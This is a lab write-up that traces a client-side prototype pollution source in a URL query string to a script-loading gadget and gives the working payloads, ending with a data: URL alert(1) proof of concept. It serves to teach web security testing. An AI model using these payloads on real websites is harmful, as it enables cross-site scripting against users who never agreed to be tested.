1. Identifying the Prototype Pollution Source

The application processes parameters supplied through the URL query string.

The following payload was used:

/?__proto__[foo]=bar

After loading the URL, the browser DevTools Console was opened and:

Object.prototype

was executed.

The resulting object contained the injected property:

foo: "bar"

This confirmed that attacker-controlled input could modify the global Object.prototype.

Therefore, a prototype pollution source had been identified.

Prototype Pollution Source

The vulnerable parameter was:

__proto__

The following payload:

/?__proto__[foo]=bar

resulted conceptually in:

Object.prototype.foo = "bar";

The attack flow was:

Attacker-controlled URL
        │
        ▼
__proto__[foo]=bar
        │
        ▼
Query-string parser
        │
        ▼
Object.prototype
        │
        ▼
foo = "bar"
Identifying the Gadget

The JavaScript files loaded by the application were inspected using the browser's Sources panel.

The relevant functionality was located in:

searchLogger.js

The application contained logic equivalent to:

if(config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}

The important property was:

transport_url

The application did not explicitly define this property on the config object.

However, JavaScript property lookup also searches the object's prototype chain.

Therefore, if an attacker could inject:

Object.prototype.transport_url

the application could access the malicious value through:

config.transport_url

This made transport_url a viable prototype pollution gadget.

Testing the Gadget

The prototype pollution source was combined with the identified gadget.

The following payload was submitted:

/?__proto__[transport_url]=foo

The DOM was then inspected using the Elements panel.

A dynamically generated script element was observed:

<script src="foo"></script>

This confirmed that the attacker-controlled prototype property reached the DOM XSS sink.

Exploitation

The arbitrary value was replaced with a data: URL containing JavaScript:

/?__proto__[transport_url]=data:,alert(1);

The prototype pollution effectively caused:

Object.prototype.transport_url = "data:,alert(1);";

Because config inherited from Object.prototype, the following property lookup:

config.transport_url

returned the attacker-controlled value.

The application then executed:

let script = document.createElement('script');
script.src = config.transport_url;
document.body.appendChild(script);

This resulted in a DOM element equivalent to:

<script src="data:,alert(1);"></script>

The browser executed the JavaScript contained in the data: URL:

alert(1);

The laboratory was successfully solved.

